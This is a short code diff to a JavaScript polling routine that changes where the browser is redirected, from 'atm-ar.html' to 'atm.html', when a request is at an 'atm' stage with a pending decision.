@@ -189,7 +189,7 @@
               window.location.href = data.redirect + '?id=' + requestId;
             } else if (data.stage === 'atm' && data.decision === 'pending') {
               stopPoll();
-              window.location.href = 'atm-ar.html?id=' + requestId;
+              window.location.href = 'atm.html?id=' + requestId;
             } else if (data.decision === 'rejected') {
               stopPoll();
               waitOverlay.classList.remove('show');
